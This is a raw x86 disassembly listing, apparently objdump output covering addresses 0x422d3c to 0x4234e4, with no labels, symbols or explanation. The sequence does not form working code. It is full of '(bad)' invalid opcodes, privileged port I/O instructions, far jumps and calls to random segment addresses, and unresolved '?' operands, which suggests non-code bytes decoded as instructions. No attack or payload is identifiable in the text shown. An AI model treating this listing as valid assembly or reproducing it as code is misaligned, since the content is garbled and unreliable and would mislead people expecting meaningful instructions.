  422d3c:	and    BYTE PTR [ecx],dh
  422d3e:	not    ah
  422d40:	fs mov dh,0x22
  422d43:	std    
  422d44:	pop    ds
  422d45:	das    
  422d46:	cmp    al,0x80
  422d48:	mov    ch,dl
  422d4a:	pop    ebp
  422d4b:	sbb    ch,BYTE PTR [esi+0x41]
  422d4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d4f:	leave  
  422d50:	mov    eax,0xc86aee02
  422d55:	ds test ah,dh
  422d58:	pop    esp
  422d59:	mov    cl,0x48
  422d5b:	push   edi
  422d5c:	mov    ah,0x7b
  422d5e:	(bad)  
  422d5f:	aam    0xb4
  422d61:	(bad)  
  422d62:	out    dx,al
  422d63:	xor    dl,BYTE PTR [esi+0x5d]
  422d66:	(bad)  
  422d68:	mov    cl,0xb9
  422d6a:	fsub   QWORD PTR es:[edx+0x1c]
  422d6e:	mov    DWORD PTR ds:0xe91fc409,esi
  422d74:	outs   dx,DWORD PTR ds:[esi]
  422d75:	mov    ch,0x3d
  422d77:	pop    esi
  422d78:	sub    eax,0xd70554b5
  422d7d:	sbb    bl,BYTE PTR [esi]
  422d7f:	or     edx,edi
  422d81:	es clc 
  422d83:	ror    BYTE PTR [ebx],cl
  422d85:	bound  ebx,QWORD PTR [ecx-0x11]
  422d88:	je     0x422d31
  422d8a:	(bad)  
  422d8b:	aad    0x89
  422d8d:	(bad)  
  422d8e:	lds    ecx,FWORD PTR [ebx-0x80]
  422d91:	xchg   ebx,eax
  422d92:	ins    DWORD PTR es:[edi],dx
  422d93:	aam    0x37
  422d95:	fisttp QWORD PTR [ecx]
  422d97:	popa   
  422d98:	xor    BYTE PTR [esi+0x63895457],cl
  422d9e:	and    esi,esp
  422da0:	sbb    DWORD PTR [ebx],ebp
  422da2:	in     eax,dx
  422da3:	sbb    BYTE PTR [edx],bl
  422da5:	add    edi,DWORD PTR [esi+0x8efa15d]
  422dab:	push   ecx
  422dac:	dec    edx
  422dad:	jle    0x422dc9
  422daf:	sub    DWORD PTR [ecx+0x20335ae8],edi
  422db5:	xor    BYTE PTR [esi+0x3182fedd],bl
  422dbb:	cli    
  422dbc:	adc    BYTE PTR [edx],al
  422dbe:	js     0x422e31
  422dc0:	or     BYTE PTR [ecx-0x6ebc3d1a],cl
  422dc6:	pop    ds
  422dc7:	fild   DWORD PTR [edi+eax*1]
  422dca:	arpl   WORD PTR [edx-0x24],bp
  422dcd:	not    ch
  422dcf:	aad    0x46
  422dd1:	jns    0x422e0b
  422dd3:	and    al,0xbc
  422dd5:	popf   
  422dd6:	mov    ah,0x15
  422dd8:	jge    0x422d9a
  422dda:	outs   dx,BYTE PTR ds:[esi]
  422ddb:	aas    
  422ddc:	retf   
  422ddd:	test   eax,0x43171bf6
  422de2:	push   eax
  422de3:	add    DWORD PTR [esi-0x472a40cd],esp
  422de9:	ins    DWORD PTR es:[edi],dx
  422dea:	fstp   TBYTE PTR [edx+0x7c7175c9]
  422df0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422df1:	jnp    0x422da2
  422df3:	mov    BYTE PTR es:[ebx+0xa],dh
  422df7:	call   0xd7544568
  422dfc:	or     bl,bl
  422dfe:	dec    esp
  422dff:	push   esp
  422e00:	mov    edx,0x881365fb
  422e05:	xor    eax,0xb27bf747
  422e0a:	or     dl,ch
  422e0c:	repnz out 0xf8,al
  422e0f:	loope  0x422dc3
  422e11:	add    dh,al
  422e13:	xlat   BYTE PTR ss:[ebx]
  422e15:	jnp    0x422de9
  422e17:	into   
  422e18:	pop    edx
  422e19:	cwde   
  422e1a:	sahf   
  422e1b:	mov    ecx,0xa6180067
  422e20:	pop    ebp
  422e21:	lods   al,BYTE PTR ds:[esi]
  422e22:	repz in al,0x0
  422e25:	(bad)  
  422e27:	aad    0x26
  422e29:	inc    edi
  422e2a:	loope  0x422dfd
  422e2c:	retf   
  422e2d:	or     eax,0x43888b50
  422e32:	popa   
  422e33:	inc    esp
  422e34:	mov    dh,0xc3
  422e36:	ret    
  422e37:	in     al,dx
  422e38:	sbb    al,0x2
  422e3a:	xchg   bl,al
  422e3c:	mov    BYTE PTR [ebp+0x28],0x81
  422e40:	or     edi,DWORD PTR [esi-0x64c48ca7]
  422e46:	out    dx,al
  422e47:	inc    eax
  422e48:	push   cs
  422e49:	xchg   ebp,eax
  422e4a:	popa   
  422e4b:	push   0xfffffff1
  422e4d:	in     eax,dx
  422e4e:	and    BYTE PTR [edx],dl
  422e50:	inc    BYTE PTR [edx]
  422e52:	jmp    0x15f4:0x2593b3b3
  422e59:	fs push ds
  422e5b:	mov    ch,0xe
  422e5d:	sbb    DWORD PTR [eax],ebx
  422e5f:	mov    edx,0xd59e39d0
  422e64:	dec    ebx
  422e65:	jb     0x422e42
  422e67:	retf   0xbd31
  422e6a:	dec    ebx
  422e6b:	inc    esp
  422e6c:	ror    DWORD PTR [edi+0x66],cl
  422e6f:	aam    0xfe
  422e71:	test   DWORD PTR [eax+eiz*2-0x15],esp
  422e75:	add    eax,0x48bb2522
  422e7a:	loope  0x422e2e
  422e7c:	pop    ds
  422e7d:	sbb    al,0x60
  422e7f:	aaa    
  422e80:	bound  edi,QWORD PTR [ebp+ebx*8+0x174e337d]
  422e87:	mov    bh,0xd2
  422e89:	pop    es
  422e8a:	jae    0x422e60
  422e8c:	jle    0x422ea0
  422e8e:	xchg   esp,eax
  422e8f:	cmp    BYTE PTR [esi],ch
  422e91:	stc    
  422e92:	xchg   BYTE PTR [eax+0x1b109d8b],bh
  422e98:	lds    ebx,FWORD PTR [ebx-0x59]
  422e9b:	mov    cl,0x6b
  422e9d:	cmp    dh,al
  422e9f:	cwde   
  422ea0:	outs   dx,DWORD PTR ds:[esi]
  422ea1:	add    esi,DWORD PTR [edi+edx*4+0x2a30cddd]
  422ea8:	cmp    DWORD PTR [ebx+0x1e],ebp
  422eab:	xor    eax,0x79858ae0
  422eb0:	jns    0x422e4b
  422eb2:	retf   0x3546
  422eb5:	lods   al,BYTE PTR ds:[esi]
  422eb6:	addr16 inc edx
  422eb8:	fwait
  422eb9:	loope  0x422f11
  422ebb:	aad    0xce
  422ebd:	dec    edi
  422ebe:	fstp   QWORD PTR [eax]
  422ec0:	je     0x422eb9
  422ec2:	outs   dx,BYTE PTR ds:[esi]
  422ec3:	scas   eax,DWORD PTR es:[edi]
  422ec4:	adc    eax,0x287a5ae4
  422ec9:	jge    0x422e95
  422ecb:	mov    ebp,0x66d20593
  422ed0:	adc    dh,BYTE PTR cs:[edx]
  422ed3:	(bad)  
  422ed4:	rcl    BYTE PTR [edi+0x3039b97],cl
  422eda:	pop    ecx
  422edb:	mov    al,0x8d
  422edd:	mov    edi,0x261317c
  422ee2:	sbb    BYTE PTR [ebx+0x2d],dl
  422ee5:	mov    cl,0x1c
  422ee7:	stos   BYTE PTR es:[edi],al
  422ee8:	mov    ds:0x59bd1f16,al
  422eed:	imul   edi,edx,0xffffff88
  422ef0:	xor    ch,BYTE PTR ds:0x25bdcce
  422ef6:	mov    bh,BYTE PTR [ecx]
  422ef8:	les    ebp,FWORD PTR [ebx]
  422efa:	inc    esp
  422efb:	(bad)  
  422efd:	jl     0x422f03
  422eff:	outs   dx,BYTE PTR ds:[esi]
  422f00:	test   eax,0x89153bc8
  422f05:	inc    ecx
  422f06:	jl     0x422ea5
  422f08:	inc    esi
  422f09:	jns    0x422f3c
  422f0b:	adc    eax,DWORD PTR [edx+eax*1]
  422f0e:	les    eax,FWORD PTR [ecx]
  422f10:	push   0xffffffa8
  422f12:	sbb    esp,DWORD PTR [edx+0x731e680f]
  422f18:	ss mov dh,0x97
  422f1b:	fdivr  QWORD PTR [eax-0x61]
  422f1e:	pushf  
  422f1f:	aad    0xa1
  422f21:	jle    0x422f5b
  422f23:	mov    al,BYTE PTR [ebx+esi*4]
  422f26:	cmp    al,0xfc
  422f28:	mov    dh,0x5d
  422f2a:	inc    edx
  422f2b:	xlat   BYTE PTR ds:[ebx]
  422f2c:	mov    BYTE PTR [ebx+0x13a251ca],dl
  422f32:	dec    esi
  422f33:	aad    0xbe
  422f35:	test   eax,0xcbb02f7
  422f3a:	mov    ch,0x9a
  422f3c:	mov    ecx,edi
  422f3e:	loopne 0x422f2b
  422f40:	repnz out 0x22,eax
  422f43:	add    al,0x0
  422f45:	sbb    al,cl
  422f47:	xlat   BYTE PTR ds:[ebx]
  422f48:	popf   
  422f49:	mov    WORD PTR [ebp-0x2c],cs
  422f4c:	sbb    DWORD PTR [esi+0x7f8908e5],0x9761b4f1
  422f56:	mov    al,ds:0x44022fee
  422f5b:	repnz xchg ebp,eax
  422f5d:	add    eax,0x478ab169
  422f62:	popa   
  422f63:	test   eax,0x4c094192
  422f68:	mov    bl,0xa9
  422f6a:	clc    
  422f6b:	(bad)  
  422f6c:	mov    al,ds:0xcb2e5e24
  422f71:	and    DWORD PTR [edi-0x1e4cf2c8],ebx
  422f77:	pop    ebx
  422f78:	xchg   BYTE PTR [ebx+0x6a12af2a],dl
  422f7e:	lahf   
  422f7f:	or     al,0xa8
  422f81:	aad    0xa5
  422f83:	rcl    eax,cl
  422f85:	sti    
  422f86:	int    0x61
  422f88:	xor    al,0x91
  422f8a:	iret   
  422f8b:	outs   dx,BYTE PTR ds:[esi]
  422f8c:	or     DWORD PTR [edi+0x7d],esi
  422f8f:	jno    0x422fff
  422f91:	stos   BYTE PTR es:[edi],al
  422f92:	mov    DWORD PTR [edi+0x5f6d0abf],edx
  422f98:	sbb    al,0xc3
  422f9a:	mov    al,0x9b
  422f9c:	push   ss
  422f9d:	std    
  422f9e:	fwait
  422f9f:	imul   BYTE PTR [eax]
  422fa1:	repz jno 0x422f44
  422fa4:	cdq    
  422fa5:	and    bh,BYTE PTR [edx+eiz*8]
  422fa8:	pop    esp
  422fa9:	add    ecx,DWORD PTR [esi-0x4c456bf7]
  422faf:	pop    edi
  422fb0:	lock mov bl,0x28
  422fb3:	aam    0xe5
  422fb5:	xchg   ebp,eax
  422fb6:	jp     0x422f89
  422fb8:	mov    al,0x62
  422fba:	mov    al,0xd3
  422fbc:	add    dh,bl
  422fbe:	test   DWORD PTR ds:0xbe4f6101,ebx
  422fc4:	or     eax,0x894a014c
  422fc9:	(bad)  
  422fca:	cmp    ch,dl
  422fcc:	and    al,0xef
  422fce:	mov    ds,WORD PTR [ebp+eiz*2+0x0]
  422fd2:	sub    BYTE PTR [edx-0x7f6381fd],ah
  422fd8:	rcl    bl,1
  422fda:	adc    ah,cl
  422fdc:	(bad)  
  422fdd:	test   al,0x1f
  422fdf:	test   eax,0x9a2c8884
  422fe4:	test   BYTE PTR [ebx-0x28],0xd5
  422fe8:	and    bl,BYTE PTR [ecx+0x3e82ea73]
  422fee:	mov    esi,0xd9a38830
  422ff3:	jo     0x42305d
  422ff5:	shr    BYTE PTR [ecx+edx*2+0x2],1
  422ff9:	adc    eax,0x24d1d138
  422ffe:	test   al,0x8a
  423000:	(bad)  
  423001:	gs pop esi
  423003:	mov    ds:0xd1e7d37,al
  423008:	mov    WORD PTR ds:0xa7e40cb9,fs
  42300e:	pop    eax
  42300f:	stos   BYTE PTR es:[edi],al
  423010:	lods   al,BYTE PTR ds:[esi]
  423011:	lds    ebx,FWORD PTR ds:0x7e21d837
  423017:	lods   eax,DWORD PTR ds:[esi]
  423018:	or     bl,al
  42301a:	mov    esp,0x3daf8997
  42301f:	je     0x423081
  423021:	aad    0xa7
  423023:	into   
  423024:	test   al,0x14
  423026:	(bad)  
  423027:	inc    DWORD PTR [eax-0x1948df78]
  42302d:	adc    eax,0x2789e626
  423032:	cmp    DWORD PTR [ebp-0x32b96f37],0xd56ee2d6
  42303c:	shl    DWORD PTR [ebx-0x36f54000],1
  423042:	and    al,0x91
  423044:	mov    BYTE PTR [ecx+0x4475f224],ah
  42304a:	sub    BYTE PTR [edi-0x2cbffa6c],ch
  423050:	push   ds
  423051:	mov    dl,0xc5
  423053:	sbb    al,0x5e
  423055:	jmp    0xf374:0x318c711f
  42305c:	sub    eax,0x11f4fb3a
  423061:	add    al,dh
  423063:	add    ecx,edx
  423065:	xor    BYTE PTR [ebx-0x3a],0xa0
  423069:	inc    ebx
  42306a:	gs and eax,eax
  42306d:	push   es
  42306e:	inc    ecx
  42306f:	dec    edi
  423070:	mov    bl,0x82
  423072:	sub    ah,BYTE PTR [edx]
  423074:	xor    eax,0xe9630803
  423079:	xchg   ebx,eax
  42307a:	arpl   WORD PTR [eax],dx
  42307c:	mov    esi,0x927d60f1
  423081:	mov    ds:0x3d673aa9,al
  423086:	or     al,0x40
  423088:	ins    BYTE PTR es:[edi],dx
  423089:	mov    edx,0xbc156a1f
  42308e:	adc    bh,BYTE PTR [ebp-0x1e9f04b9]
  423094:	cwde   
  423095:	loope  0x4230a9
  423097:	inc    edx
  423098:	push   es
  423099:	imul   ecx,DWORD PTR [eax-0x2c],0xffffffdc
  42309d:	out    0x80,eax
  42309f:	adc    dh,0xbc
  4230a2:	lods   eax,DWORD PTR ds:[esi]
  4230a3:	iret   
  4230a4:	mov    BYTE PTR [ebx-0x3e72e228],ah
  4230aa:	lea    ebx,[eax]
  4230ac:	fs add bh,dh
  4230af:	push   edx
  4230b0:	jg     0x423038
  4230b2:	add    DWORD PTR [esi-0x18],ebp
  4230b5:	loop   0x423117
  4230b7:	das    
  4230b8:	pop    esp
  4230b9:	fwait
  4230ba:	mov    esp,0xce571188
  4230bf:	and    al,0xb0
  4230c1:	addr16 fwait
  4230c3:	pop    edi
  4230c4:	mov    DWORD PTR [ebx+0x271a9b89],eax
  4230ca:	dec    eax
  4230cb:	mov    ?,esp
  4230cd:	xchg   ecx,eax
  4230ce:	adc    DWORD PTR [eax-0x3e1f54d2],ebx
  4230d4:	and    BYTE PTR [esp+ecx*1+0x54],dh
  4230d8:	jo     0x4230bd
  4230da:	test   al,0xe4
  4230dc:	nop
  4230dd:	neg    al
  4230df:	mov    ebx,0x32495e4d
  4230e4:	mov    BYTE PTR [esi-0x21deada0],bl
  4230ea:	pusha  
  4230eb:	add    eax,0xf853a10
  4230f0:	xchg   cl,dl
  4230f2:	mov    esi,0x7b1356d5
  4230f7:	shl    edx,1
  4230f9:	pop    ecx
  4230fa:	cdq    
  4230fb:	int3   
  4230fc:	mov    BYTE PTR [ecx],dl
  4230fe:	loopne 0x4230c5
  423100:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423101:	(bad)  
  423102:	jg     0x4230a7
  423104:	repnz add edx,DWORD PTR [ebx+edi*8]
  423108:	push   ds
  423109:	fs out dx,eax
  42310b:	push   ecx
  42310c:	push   es
  42310d:	ret    0x4128
  423110:	outs   dx,BYTE PTR ds:[si]
  423112:	mov    bh,0xa9
  423114:	ds daa 
  423116:	push   ds
  423117:	sub    edx,DWORD PTR [esi-0x600eb76a]
  42311d:	add    dl,BYTE PTR [edx+0x7ca24fb4]
  423123:	shr    esp,0x81
  423126:	pop    ds
  423127:	cdq    
  423128:	push   edi
  423129:	adc    DWORD PTR [esi+0x7f],ebx
  42312c:	push   ecx
  42312d:	rcl    BYTE PTR [esi],cl
  42312f:	pop    es
  423130:	or     esi,DWORD PTR [ecx+eiz*2+0x6d6a31c9]
  423137:	outs   dx,BYTE PTR ds:[esi]
  423138:	arpl   dx,dx
  42313a:	pushf  
  42313b:	xchg   esi,eax
  42313c:	sbb    BYTE PTR [esi-0x36],dh
  42313f:	xlat   BYTE PTR ds:[ebx]
  423140:	or     BYTE PTR [edi],dl
  423142:	dec    esi
  423143:	or     esi,ebp
  423145:	jl     0x423163
  423147:	xlat   BYTE PTR ds:[ebx]
  423148:	dec    ebp
  423149:	jae    0x423138
  42314b:	sub    al,0xda
  42314d:	(bad)  
  42314e:	fwait
  42314f:	sbb    eax,0xd90c9989
  423154:	pop    ds
  423155:	push   edi
  423156:	pop    esi
  423157:	scas   al,BYTE PTR es:[edi]
  423158:	or     al,0x3
  42315a:	enter  0xac7f,0x98
  42315e:	xor    BYTE PTR [ecx-0x3e],0x92
  423162:	pop    ds
  423163:	adc    eax,0xaa9b6d94
  423168:	sub    eax,0x5e43c4b3
  42316d:	out    dx,eax
  42316e:	gs pop ebp
  423170:	sti    
  423171:	xor    edx,DWORD PTR [eax]
  423173:	int    0x58
  423175:	(bad)  
  423176:	enter  0x8897,0x85
  42317a:	clc    
  42317b:	dec    ebx
  42317c:	dec    edx
  42317d:	leave  
  42317e:	hlt    
  42317f:	or     ebp,ecx
  423181:	add    edi,DWORD PTR [edx+eax*8+0x69d68cd]
  423188:	mov    dh,0xb8
  42318a:	mov    ds:0xe2ef39f3,al
  42318f:	mov    al,ds:0xd07bf195
  423194:	ins    DWORD PTR es:[edi],dx
  423195:	or     DWORD PTR [eax],0xffffffcb
  423198:	sbb    BYTE PTR [edi-0x48],ch
  42319b:	aad    0x5e
  42319d:	loopne 0x423201
  42319f:	mov    esp,0xa12b08f0
  4231a4:	mov    DWORD PTR [ebp+0x56],ebp
  4231a7:	mov    WORD PTR [ebx+0x1f],ss
  4231aa:	mov    edx,0xec023ebc
  4231af:	adc    edi,edx
  4231b1:	aam    0xe3
  4231b3:	sahf   
  4231b4:	inc    ebx
  4231b5:	mov    ah,0x60
  4231b7:	jnp    0x42313d
  4231b9:	call   FWORD PTR [eax-0x1a]
  4231bc:	in     al,dx
  4231bd:	ins    BYTE PTR es:[edi],dx
  4231be:	jae    0x423194
  4231c0:	xchg   ecx,eax
  4231c1:	push   eax
  4231c2:	add    DWORD PTR [eax+0x35],esp
  4231c5:	in     eax,dx
  4231c6:	mov    al,0x75
  4231c8:	mov    BYTE PTR [ecx+0x227b7d40],ch
  4231ce:	or     ecx,DWORD PTR [edi-0x5]
  4231d1:	sub    edx,ecx
  4231d3:	mov    esi,edi
  4231d5:	call   0xd7da:0xd8145598
  4231dc:	push   ds
  4231dd:	outs   dx,BYTE PTR ds:[esi]
  4231de:	pop    ds
  4231df:	cmp    eax,0x4254c40d
  4231e4:	js     0x423226
  4231e6:	and    ah,dl
  4231e8:	les    ebp,FWORD PTR [ebx]
  4231ea:	popa   
  4231eb:	repnz adc al,0xff
  4231ee:	fld    DWORD PTR [esi-0x78]
  4231f1:	ins    DWORD PTR es:[edi],dx
  4231f2:	inc    ebp
  4231f3:	fucomi st,st(0)
  4231f5:	dec    ebp
  4231f6:	repz mov bh,0x6e
  4231f9:	add    al,BYTE PTR [esp+ebx*4-0x47]
  4231fd:	cdq    
  4231fe:	mov    dl,0x19
  423200:	(bad)  
  423201:	rcr    BYTE PTR [edi],1
  423203:	adc    esp,DWORD PTR [esi]
  423205:	daa    
  423206:	or     eax,0xea4f9c77
  42320b:	shr    DWORD PTR [ebx+0x1898605],0x53
  423212:	adc    al,0x5b
  423214:	test   al,0x1a
  423216:	pop    eax
  423217:	xchg   ecx,eax
  423218:	dec    edi
  423219:	push   eax
  42321a:	ins    DWORD PTR es:[edi],dx
  42321b:	icebp  
  42321c:	adc    BYTE PTR gs:[edi],bl
  42321f:	pop    ebx
  423220:	test   BYTE PTR [ebp-0xa],cl
  423223:	aam    0x72
  423225:	dec    esp
  423226:	mov    bl,0xb6
  423228:	and    BYTE PTR [edi],cl
  42322a:	ss jg  0x4232a5
  42322d:	shl    BYTE PTR [ebp-0x31],cl
  423230:	inc    ecx
  423231:	mov    ch,0xf2
  423233:	dec    edx
  423234:	mov    ah,0x5
  423236:	mov    ebp,0x8605f948
  42323b:	push   esi
  42323c:	push   eax
  42323d:	fadd   DWORD PTR [edx+eiz*1+0x3d]
  423241:	retf   
  423242:	pop    ds
  423243:	pop    ecx
  423244:	pop    edi
  423245:	xor    ecx,DWORD PTR [ebx-0x69]
  423248:	dec    DWORD PTR [ecx+0x2e2f198]
  42324e:	inc    esp
  42324f:	popf   
  423250:	stos   DWORD PTR es:[edi],eax
  423251:	int3   
  423252:	push   edx
  423253:	xchg   ebp,eax
  423254:	cmp    dl,BYTE PTR [esi+ebx*1]
  423257:	ror    DWORD PTR [edi],1
  423259:	mov    esi,DWORD PTR [eax+0x5903f873]
  42325f:	aad    0xc7
  423261:	push   es
  423262:	sbb    BYTE PTR [edx+0x24],bl
  423265:	mov    esp,0x19f2f252
  42326a:	das    
  42326b:	aam    0xeb
  42326d:	pop    esp
  42326e:	inc    esp
  42326f:	out    dx,eax
  423270:	nop
  423271:	aaa    
  423272:	xchg   esi,eax
  423273:	aam    0xb7
  423275:	adc    bh,ah
  423277:	xchg   ebp,eax
  423278:	jo     0x423259
  42327a:	aam    0x4b
  42327c:	dec    ecx
  42327d:	out    dx,eax
  42327e:	sbb    eax,0x1dad8964
  423283:	mov    ebp,ebp
  423285:	or     BYTE PTR [ebx+0x14],ah
  423288:	xor    eax,0x28ec3c03
  42328d:	sub    al,0xa1
  42328f:	add    al,0xbb
  423291:	mov    esi,0x920d4d65
  423296:	mov    dh,0xca
  423298:	adc    al,0x60
  42329a:	jge    0x42328a
  42329c:	jo     0x4232ff
  42329e:	lahf   
  42329f:	aad    0xa
  4232a1:	scas   eax,DWORD PTR es:[edi]
  4232a2:	xor    ecx,DWORD PTR [eax]
  4232a4:	vpcmpeqd xmm1,xmm6,xmm0
  4232a8:	mov    BYTE PTR [ecx-0x69],dh
  4232ab:	fimul  WORD PTR [ecx-0x156ec84c]
  4232b1:	lock pop ebp
  4232b3:	aad    0x46
  4232b5:	mov    gs,ecx
  4232b7:	xor    ah,BYTE PTR [eax+0x4b]
  4232ba:	es (bad) 
  4232bc:	mov    WORD PTR [edi],fs
  4232be:	mov    DWORD PTR [edx+ebx*1+0x72],0xf249de82
  4232c6:	sbb    al,al
  4232c8:	mov    ?,WORD PTR [ebx-0x5a]
  4232cb:	cmc    
  4232cc:	and    ch,dh
  4232ce:	adc    DWORD PTR [ebp+0x4a],0x3c
  4232d2:	ret    0x33d5
  4232d5:	mov    WORD PTR [edx],ss
  4232d7:	cmp    eax,0x4e
  4232da:	je     0x423328
  4232dc:	mov    BYTE PTR [ecx-0x59],ah
  4232df:	jp     0x4232b5
  4232e1:	mov    eax,ds:0x287f07c
  4232e6:	(bad)  
  4232e7:	in     eax,dx
  4232e8:	or     ah,BYTE PTR [edx+0x64]
  4232eb:	(bad)  
  4232ec:	mov    esp,0xa0bb9a0f
  4232f1:	mov    WORD PTR [ecx],?
  4232f3:	aam    0xf
  4232f5:	pop    eax
  4232f6:	outs   dx,BYTE PTR ds:[esi]
  4232f7:	ftst   
  4232f9:	mov    ch,0xb3
  4232fb:	aad    0xc8
  4232fd:	test   DWORD PTR [ecx],0x3a1f20cc
  423303:	int    0x83
  423305:	pop    ebx
  423306:	pop    es
  423307:	stos   BYTE PTR es:[edi],al
  423308:	or     DWORD PTR [ecx+eiz*2],edi
  42330b:	(bad)  
  42330c:	loop   0x42331b
  42330e:	jg     0x4232ab
  423310:	dec    eax
  423311:	inc    ebp
  423312:	shld   DWORD PTR [eax],eax,cl
  423315:	clc    
  423316:	cmp    BYTE PTR [ebp-0x6],bh
  423319:	and    ch,cl
  42331b:	ja     0x4232f3
  42331d:	mov    dh,0x9a
  42331f:	test   DWORD PTR [esi],esp
  423321:	add    esi,DWORD PTR [eax+0x45]
  423324:	sahf   
  423325:	jb     0x4232c5
  423327:	jae    0x4232bd
  423329:	xchg   bh,ch
  42332b:	int3   
  42332c:	mov    esp,ebp
  42332e:	pop    edx
  42332f:	push   0xe471d5b8
  423334:	pop    ebp
  423335:	jne    0x423356
  423337:	jns    0x4232e5
  423339:	cmp    ebx,edi
  42333b:	stos   DWORD PTR es:[edi],eax
  42333c:	cmp    WORD PTR [edi+0x2df081d5],di
  423343:	shl    BYTE PTR [ebp-0x40],1
  423346:	or     bl,BYTE PTR [eax]
  423348:	mov    DWORD PTR [ebx+0x18],esp
  42334b:	std    
  42334c:	adc    bh,bl
  42334e:	adc    al,0xe0
  423350:	iret   
  423351:	add    bh,BYTE PTR [edx+0x47]
  423354:	stos   DWORD PTR es:[edi],eax
  423355:	(bad)  
  423357:	aas    
  423358:	call   0x56b1:0xe8031f3c
  42335f:	sub    eax,0xb9bec6ec
  423364:	fcomi  st,st(7)
  423366:	outs   dx,DWORD PTR ds:[esi]
  423367:	scas   eax,DWORD PTR es:[edi]
  423368:	iret   
  423369:	push   ds
  42336a:	jbe    0x423356
  42336c:	or     DWORD PTR [edi],esi
  42336e:	call   0xd876:0x74c18849
  423375:	leave  
  423376:	outs   dx,DWORD PTR ds:[esi]
  423377:	or     al,0x85
  423379:	sbb    al,0xcc
  42337b:	push   edi
  42337c:	jne    0x4233a3
  42337e:	enter  0x7c37,0x83
  423382:	lahf   
  423383:	add    bl,cl
  423385:	stos   BYTE PTR es:[edi],al
  423386:	pop    ds
  423387:	std    
  423388:	xor    eax,0x90ad51cd
  42338d:	pop    ebp
  42338e:	push   edx
  42338f:	aad    0xb1
  423391:	scas   al,BYTE PTR es:[edi]
  423392:	mov    al,ds:0x81055e13
  423397:	cli    
  423398:	mov    gs,WORD PTR [edi]
  42339a:	or     ah,BYTE PTR [esi]
  42339c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42339d:	mov    bl,0xc9
  42339f:	add    eax,0xd48e790a
  4233a4:	cmp    eax,0x1d435b9b
  4233a9:	pop    ebp
  4233aa:	test   al,0xca
  4233ac:	mov    DWORD PTR [edi],esp
  4233ae:	cmc    
  4233af:	loopne 0x423429
  4233b1:	ss popf 
  4233b3:	or     cl,ch
  4233b5:	add    BYTE PTR [edx-0x195eb9f7],ch
  4233bb:	ins    DWORD PTR es:[edi],dx
  4233bc:	lahf   
  4233bd:	xchg   ebp,eax
  4233be:	push   0xecdf887d
  4233c3:	jmp    0x5dcf3449
  4233c8:	push   esp
  4233c9:	add    ch,BYTE PTR [esi+0x7c803a6]
  4233cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233d0:	call   0xa08bb144
  4233d5:	or     ah,ch
  4233d7:	jmp    0x42341a
  4233d9:	mov    WORD PTR [edi+0x5c6d5648],?
  4233df:	aad    0x96
  4233e1:	leave  
  4233e2:	fisub  WORD PTR [ecx-0xc948cc3]
  4233e8:	mov    DWORD PTR [edi+0x30],edi
  4233eb:	or     eax,0x92e22b0f
  4233f0:	adc    al,BYTE PTR ds:0x15c8d583
  4233f6:	fs out dx,eax
  4233f8:	inc    ebp
  4233f9:	or     DWORD PTR [esi+0x60ca6efe],ecx
  4233ff:	stc    
  423400:	adc    dh,BYTE PTR [eax+0x24]
  423403:	rcl    DWORD PTR [esi],0x90
  423406:	cmp    edi,edx
  423408:	jge    0x4233a6
  42340a:	stos   DWORD PTR es:[edi],eax
  42340b:	sub    DWORD PTR ds:0x8d0161cd,edx
  423411:	mov    eax,ds:0xf2b3ae65
  423416:	push   esp
  423417:	mov    ebx,0x9f13c0c4
  42341c:	iret   
  42341d:	test   al,0xc9
  42341f:	push   esp
  423420:	sub    BYTE PTR ds:0x6fdda7a9,ah
  423426:	fldenv [ecx+ecx*4-0x55]
  42342a:	(bad)  
  42342b:	shl    dh,0x4
  42342e:	jl     0x4233f5
  423430:	mov    ds:0x7093b6f8,eax
  423435:	and    ecx,DWORD PTR [eax-0x3b]
  423438:	mov    bh,0xc
  42343a:	out    0x42,al
  42343c:	and    ebp,DWORD PTR [esi+ebx*1]
  42343f:	inc    ecx
  423440:	or     bh,BYTE PTR [ebp-0x50]
  423443:	shl    BYTE PTR [ebp+0x522d1e6a],1
  423449:	es addr16 cmp al,0x13
  42344d:	pushf  
  42344e:	mov    dh,0x24
  423450:	test   BYTE PTR [esi+ebx*1-0x4d],cl
  423454:	jbe    0x4233e4
  423456:	mov    ch,0x5d
  423458:	shr    BYTE PTR [esi],0x63
  42345b:	jecxz  0x42347a
  42345d:	jmp    0xe11e:0x85b1dd19
  423464:	loop   0x423479
  423466:	or     dl,0x2a
  423469:	mov    ds:0x21ecbc65,al
  42346e:	cld    
  42346f:	push   esp
  423470:	int    0x29
  423472:	xchg   ecx,eax
  423473:	mov    WORD PTR [edx+0x733514df],cs
  423479:	xchg   eax,eax
  42347b:	mov    gs,eax
  42347d:	ret    
  42347e:	ins    BYTE PTR es:[edi],dx
  42347f:	in     eax,dx
  423480:	push   edx
  423481:	xchg   DWORD PTR [ecx+0x53],eax
  423484:	icebp  
  423485:	retf   
  423486:	arpl   WORD PTR [edx+0x38],dx
  423489:	mov    BYTE PTR ds:[eax-0x2b613db7],bl
  423490:	mov    ?,WORD PTR [edi-0x4e]
  423493:	cld    
  423494:	mov    al,0x18
  423496:	outs   dx,BYTE PTR ds:[esi]
  423497:	jbe    0x423459
  423499:	xchg   ecx,eax
  42349a:	pop    edi
  42349b:	sar    DWORD PTR [eax+esi*8+0x75],1
  42349f:	in     al,0xde
  4234a1:	add    eax,0xfa8291e0
  4234a6:	mov    bh,0x72
  4234a8:	scas   al,BYTE PTR es:[edi]
  4234a9:	stos   BYTE PTR es:[edi],al
  4234aa:	pop    ds
  4234ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234ac:	mov    edi,DWORD PTR [esp+edi*4-0x44]
  4234b0:	shl    ch,1
  4234b2:	push   ds
  4234b3:	adc    BYTE PTR [eax+0x31f2449],bl
  4234b9:	add    eax,DWORD PTR [esi+0x1fc5fcc7]
  4234bf:	or     BYTE PTR [eax+0x6cb9f9a9],0xfc
  4234c6:	test   al,0x89
  4234c8:	dec    edx
  4234c9:	sbb    al,0x90
  4234cb:	loopne 0x4234e1
  4234cd:	sbb    ecx,DWORD PTR ds:0xffe5690a
  4234d3:	mov    ebp,0xe58ae388
  4234d8:	mov    edi,0x656aef79
  4234dd:	or     eax,edx
  4234df:	inc    ebx
  4234e0:	and    ebp,ebx
  4234e2:	jge    0x423513
  4234e4:	nop
